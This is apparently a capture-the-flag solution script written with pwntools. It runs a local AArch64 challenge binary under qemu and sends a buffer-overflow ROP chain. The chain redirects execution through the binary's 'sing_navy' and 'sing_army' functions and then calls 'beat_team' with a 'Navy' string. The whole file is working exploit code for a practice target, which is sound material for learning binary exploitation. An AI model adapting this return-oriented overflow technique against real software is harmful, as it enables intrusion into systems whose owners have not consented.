from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)

gs = '''
break *0x400a40
continue
'''


def start():
    if args.GDB:
        p = process(['qemu-aarch64', '-g', '1234', '-L',
                     '/usr/aarch64-linux-gnu/', binary], level='error')
        gdb.attach(target=('localhost', 1234), exe=binary, gdbscript=gs)
        return p
    else:
        return process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', binary], level='error')


p = start()

# stage1: sing usna alma mater
payload = cyclic(16)
payload += p64(e.sym['sing_navy']+8)

# stage2: sing usma alma mater
payload += cyclic(8)
payload += p64(e.sym['sing_army']+8)

# stage3: beat_team("Navy!")
payload += cyclic(8)
payload += p64(e.sym['easy_button'])
payload += p64(next(e.search(b'Navy\x00')))
payload += cyclic(16)
payload += p64(e.sym['beat_team'])
p.sendline(payload)

p.interactive()
